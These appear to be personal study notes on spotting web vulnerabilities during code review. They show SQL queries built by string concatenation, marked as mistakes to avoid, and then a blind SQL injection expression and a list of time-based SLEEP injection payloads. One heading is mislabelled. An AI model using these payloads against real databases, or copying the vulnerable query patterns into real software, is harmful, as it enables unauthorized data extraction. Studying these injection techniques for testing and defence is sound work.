# Discovering vulns
In AWAE there was a TON of code review and POC dev; much slower than the blind
pentest process; this can still be sped up though by keeping in mind common vulns.

Good link: https://github.com/OWASP/CheatSheetSeries.git

## DotNet do NOT
DO NOT: Concatenate strings anywhere in your code and execute them against your database (Known as dynamic sql).
```
string strQry = "SELECT * FROM Users WHERE UserName='" + txtUser.Text + "' AND Password='"
                + txtPassword.Text + "'";
EXEC strQry // SQL Injection vulnerability!
```

DO NOT: append user-controlled parameters to SQL queries
```
String query = "SELECT account_balance FROM user_data WHERE user_name = "
             + request.getParameter("customerName");
try {
    Statement statement = connection.createStatement( ... );
    ResultSet results = statement.executeQuery( query );
}
```
## Blind sql injection
Example: select * from table where id = 1 AND if((ascii(lower(substring((select user()),$i,1))))!=$s,1,benchmark(200000,md5(now())))

Possible parameters for $i
```
SLEEP(5)--
SELECT BENCHMARK(1000000,MD5('A'));
id=1 OR SLEEP(25)=0 LIMIT 1--
id=1) OR SLEEP(25)=0 LIMIT 1--
id=1' OR SLEEP(25)=0 LIMIT 1--
id=1') OR SLEEP(25)=0 LIMIT 1--
id=1)) OR SLEEP(25)=0 LIMIT 1--
id=SELECT SLEEP(25)--
```
